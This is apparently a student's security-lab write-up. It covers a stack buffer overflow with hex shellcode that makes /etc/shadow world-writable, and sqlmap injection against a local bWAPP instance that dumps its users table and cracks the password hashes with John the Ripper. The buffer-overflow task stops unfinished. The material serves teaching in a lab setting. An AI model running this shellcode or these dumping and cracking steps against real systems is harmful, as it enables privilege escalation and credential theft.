# 22110088 - Bui Tho Anh Tu

## Task 1: Software buffer overflow attack
Given a vulnerable C program 
```c
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
and a shellcode in C. This shellcode executes chmod 777 /etc/shadow without having to sudo to escalate privilege
```c
#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x89\xc3\x31\xd8\x50\xbe\x3e\x1f"
"\x3a\x56\x81\xc6\x23\x45\x35\x21"
"\x89\x74\x24\xfc\xc7\x44\x24\xf8"
"\x2f\x2f\x73\x68\xc7\x44\x24\xf4"
"\x2f\x65\x74\x63\x83\xec\x0c\x89"
"\xe3\x66\x68\xff\x01\x66\x59\xb0"
"\x0f\xcd\x80";

void main() {
    int (*ret)() = (int(*)())code;
}
```
**Question 1**:
- Compile both C programs and shellcode to executable code. 
- Conduct the attack so that when C executable code runs, shellcode will also be triggered. 
  You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
**Answer 1**: Must conform to below structure:
Compile the shellcode:
```bash
gcc -g -fno-stack-protector -z execstack -o shellcode shellcode.c -mpreferred-stack-boundary=2
```
Compile the C program:
```bash
gcc -g -fno-stack-protector -z execstack -o vulnerability vulnerability.c -mpreferred-stack-boundary=2
```
Make the shellcode executed as root:
```bash
sudo chown root shellcode
sudo chmod 4777 shellcode
```
Disable the Address Space Layout Randomization (ASLR)
```bash
sudo sysctl -w kernel.randomize_va_space=0
```

Create a symbolic link to /bin/sh
```bash
sudo ln -sf /bin/zsh /bin/sh
```

Know the stack frame of the vulnerability file
![image](https://github.com/user-attachments/assets/b86505ea-f4d3-49fb-8f61-3a86a224e0d1)

# Task 2: Attack on the database of bWapp 
- Install bWapp (refer to quang-ute/Security-labs/Web-security). 
- Install sqlmap.
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 

**Question 1**: Use sqlmap to get information about all available databases
**Answer 1**:
Select SQL Injection hack
![Select sql injection](https://github.com/user-attachments/assets/0c217fd8-30ad-4f84-8320-73229277a174)

Get the URL at the page
![Get the URL](https://github.com/user-attachments/assets/008a3c9e-32fb-45ff-9369-d9f863d58934)

Get the page cookies through Chrome DevTools
![Get cookies through Chrome Devtool](https://github.com/user-attachments/assets/ceec14be-14b4-4b35-ae28-472969912817)

Find the available databases with the cookies
```bash
 sqlmap -u "http://localhost:8025/sqli_1.php" --cookie="PHPSESSID=ldg4i48a7bhj3iiagri8s3frs6; security_level=0" --forms --dbs 
```
![Available DBs](https://github.com/user-attachments/assets/c6607de6-4b69-43df-af84-d7d0d0fbc921)

**Question 2**: Use sqlmap to get tables, users information
**Answer 2**:
Get the available tables in the database
```bash
 sqlmap -u "http://localhost:8025/sqli_1.php" --cookie="PHPSESSID=ldg4i48a7bhj3iiagri8s3frs6; security_level=0" --forms --tables
```
![Available tables](https://github.com/user-attachments/assets/a13b0d64-ded1-4dbc-8a82-72597e3622f4)


# Databases and Tables

## Database: bWAPP
| Tables    |
|-----------|
| blog      |
| heroes    |
| movies    |
| users     |
| visitors  |

## Database: mysql
| Tables                                   |
|------------------------------------------|
| event                                    |
| host                                     |
| plugin                                   |
| user                                     |
| columns_priv                             |
| db                                       |
| func                                     |
| general_log                              |
| help_category                            |
| help_keyword                             |
| help_relation                            |
| help_topic                               |
| ndb_binlog_index                         |
| proc                                     |
| procs_priv                               |
| proxies_priv                             |
| servers                                  |
| slow_log                                 |
| tables_priv                              |
| time_zone                                |
| time_zone_leap_second                    |
| time_zone_name                           |
| time_zone_transition                     |
| time_zone_transition_type                |

## Database: performance_schema
| Tables                                         |
|------------------------------------------------|
| cond_instances                                  |
| events_waits_current                            |
| events_waits_history                            |
| events_waits_history_long                       |
| events_waits_summary_by_instance                |
| events_waits_summary_by_thread_by_event_name    |
| events_waits_summary_global_by_event_name       |
| file_instances                                  |
| file_summary_by_event_name                      |
| file_summary_by_instance                        |
| mutex_instances                                 |
| performance_timers                              |
| rwlock_instances                                |
| setup_consumers                                 |
| setup_instruments                               |
| setup_timers                                    |
| threads                                         |

## Information Schema Tables
| Tables                                               |
|-----------------------------------------------------|
| CHARACTER_SETS                                      |
| COLLATIONS                                          |
| COLLATION_CHARACTER_SET_APPLICABILITY               |
| COLUMN_PRIVILEGES                                   |
| FILES                                               |
| GLOBAL_STATUS                                       |
| GLOBAL_VARIABLES                                    |
| INNODB_BUFFER_PAGE                                  |
| INNODB_BUFFER_PAGE_LRU                              |
| INNODB_BUFFER_POOL_STATS                            |
| INNODB_CMP                                          |
| INNODB_CMPMEM                                       |
| INNODB_CMPMEM_RESET                                 |
| INNODB_CMP_RESET                                    |
| INNODB_LOCKS                                        |
| INNODB_LOCK_WAITS                                   |
| INNODB_TRX                                          |
| KEY_COLUMN_USAGE                                    |
| PARAMETERS                                          |
| PROFILING                                           |
| REFERENTIAL_CONSTRAINTS                             |
| ROUTINES                                            |
| SCHEMATA                                           |
| SCHEMA_PRIVILEGES                                   |
| SESSION_STATUS                                      |
| SESSION_VARIABLES                                   |
| STATISTICS                                          |
| TABLESPACES                                         |
| TABLE_CONSTRAINTS                                   |
| TABLE_PRIVILEGES                                    |
| USER_PRIVILEGES                                     |
| VIEWS                                              |
| COLUMNS                                            |
| ENGINES                                            |
| EVENTS                                             |
| PARTITIONS                                         |
| PLUGINS                                            |
| PROCESSLIST                                        |
| TABLES                                             |
| TRIGGERS                                           |



Get the columns in users table in bWAPP database
```bash
sqlmap -u "http://localhost:8025/sqli_1.php" --cookie="PHPSESSID=ldg4i48a7bhj3iiagri8s3frs6; security_level=0" --forms -D bWAPP -T users --columns
```
![columns in users](https://github.com/user-attachments/assets/33feaf68-dce9-4390-b925-f38b33e26bee)

Get all users in users table in bWAPP database
```bash
sqlmap -u "http://localhost:8025/sqli_1.php" --cookie="PHPSESSID=ldg4i48a7bhj3iiagri8s3frs6; security_level=0" --forms -D bWAPP -T users --dump
```
![users info](https://github.com/user-attachments/assets/5a609702-ac37-4e04-adc0-7b2386d52871)
![users info 2](https://github.com/user-attachments/assets/49834e33-b153-4f75-bf7b-22f5b176f6d4)

**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
**Answer 3**:
Extract the hashed password collected users from the previous question
```bash
Import-Csv "C:\Users\ADMIN\AppData\Local\sqlmap\output\localhost\dump\bWAPP\users.csv" | ForEach-Object { $_.'password' } | Out-File -FilePath "C:\Users\ADMIN\Downloads\passwords.txt"
```
Output
![hashed stored](https://github.com/user-attachments/assets/d6927cdf-e99f-4026-9d38-422ea894a01b)
![Output stored](https://github.com/user-attachments/assets/1cd28001-6256-47e6-944f-c218788ede24)

Remove the decrypted password from the file

Use John the Ripper to crack the password
```bash
.\john --format=Raw-SHA1 C:\Users\ADMIN\Downloads\passwords.txt
```
![cracked passwords using john](https://github.com/user-attachments/assets/e72e0f3f-b843-4b7f-8db7-906bf9c250a5)
